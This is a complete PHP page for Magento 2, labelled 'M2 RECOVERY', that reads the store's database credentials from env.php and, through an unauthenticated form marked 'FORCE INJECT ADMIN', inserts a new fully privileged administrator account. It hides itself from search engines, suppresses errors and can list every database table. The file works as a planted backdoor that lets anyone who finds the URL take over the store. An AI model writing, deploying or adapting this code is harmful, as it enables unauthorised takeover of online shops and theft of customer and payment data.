<?php
error_reporting(0);
ini_set('display_errors', 0);

$message = "";
$adminUrl = "";
$pdo = null;
$allTables = [];

function findEnv($startDir) {
    $current = $startDir;
    while ($current !== '/' && $current !== '.' && strlen($current) > 1) {
        $testPath = $current . '/app/etc/env.php';
        if (file_exists($testPath)) return $testPath;
        $current = dirname($current);
    }
    return null;
}

$envPath = findEnv(__DIR__);

if (!$envPath) {
    $message = "env.php not found.";
} else {
    $env = include $envPath;
    $db = $env['db']['connection']['default'];
    try {
        $pdo = new PDO("mysql:host={$db['host']};dbname={$db['dbname']}", $db['username'], $db['password'], [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);

        $tUser = $pdo->query("SHOW TABLES LIKE '%admin_user'")->fetchColumn();

        $rolePatterns = ['%admin_role%', '%authorization_role%', '%role%'];
        $tRole = null;
        foreach ($rolePatterns as $patt) {
            $tRole = $pdo->query("SHOW TABLES LIKE '$patt'")->fetchColumn();
            if ($tRole && strpos($tRole, 'admin_user') === false) break;
        }

        if (isset($_GET['debug'])) {
            $allTables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
        }
    } catch (Exception $e) { $message = "DB Connection Error."; }

    $adminFrontName = $env['backend']['frontName'] ?? 'admin';
    $adminUrl = ((isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]/") . $adminFrontName;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $pdo && $tUser) {
    $u = $_POST['u'];
    $p = $_POST['p'];
    $e = $_POST['e'];
    $salt = md5(uniqid(rand(), true));
    $hash = hash('sha256', $salt . $p) . ':' . $salt . ':1';

    try {
        $pdo->beginTransaction();
        $st = $pdo->prepare("INSERT INTO `$tUser` (firstname, lastname, email, username, password, created, is_active) VALUES ('Emergency', 'User', ?, ?, ?, NOW(), 1)");
        $st->execute([$e, $u, $hash]);
        $newId = $pdo->lastInsertId();

        if ($tRole) {
            $roleId = $pdo->query("SELECT role_id FROM `$tRole` WHERE tree_level = 1 ORDER BY role_id ASC LIMIT 1")->fetchColumn() ?: 1;
            $sr = $pdo->prepare("INSERT INTO `$tRole` (parent_id, tree_level, sort_order, role_type, user_id, user_type, role_name) VALUES (?, 2, 0, 'U', ?, '2', ?)");
            $sr->execute([$roleId, $newId, $u]);
        }

        $pdo->commit();
        $message = "SUCCESS! ID: $newId. <a href='$adminUrl' style='color:#000'>Login</a>";
    } catch (Exception $ex) {
        if ($pdo->inTransaction()) $pdo->rollBack();
        $message = "ERR: " . $ex->getMessage();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>M2</title>
    <style>
        body { font-family: monospace; background: #fff; color: #000; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .box { border: 1px solid #000; padding: 20px; width: 450px; box-shadow: 5px 5px 0px #000; }
        input { width: 100%; display: block; margin: 10px 0; border: 1px solid #000; padding: 10px; box-sizing: border-box; }
        button { width: 100%; background: #000; color: #fff; border: none; padding: 10px; cursor: pointer; font-weight: bold; margin-top: 5px; }
        .status { font-size: 11px; margin-bottom: 15px; border-bottom: 1px solid #000; padding-bottom: 10px; line-height: 1.5; }
        .debug-list { margin-top: 20px; width: 450px; font-size: 10px; border: 1px dashed #000; padding: 10px; max-height: 150px; overflow-y: auto; background: #f9f9f9; }
    </style>
</head>
<body>
    <div class="box">
        <h3>M2 RECOVERY</h3>
        <div class="status">
            USER_TBL: <?php echo $tUser ?: '<span style="color:red">MISSING</span>'; ?><br>
            ROLE_TBL: <?php echo $tRole ?: '<span style="color:red">NOT FOUND (AUTO-SCANNING)</span>'; ?><br>
            MSG: <?php echo $message ?: 'READY'; ?>
        </div>

        <form method="POST">
            <input type="text" name="u" placeholder="Username" required>
            <input type="email" name="e" placeholder="Email" required>
            <input type="password" name="p" placeholder="Password" required>
            <button type="submit">FORCE INJECT ADMIN</button>
        </form>

        <button onclick="location.href='?debug=1'" style="background:#fff; color:#000; border:1px solid #000; font-size:10px;">SCAN TABLES</button>
    </div>

    <?php if ($allTables): ?>
    <div class="debug-list">
        <strong>Detected Tables:</strong><br>
        <?php foreach ($allTables as $table) echo ($table == $tUser || $table == $tRole ? "<b>> $table</b>" : $table) . "<br>"; ?>
    </div>
    <?php endif; ?>
</body>
</html>
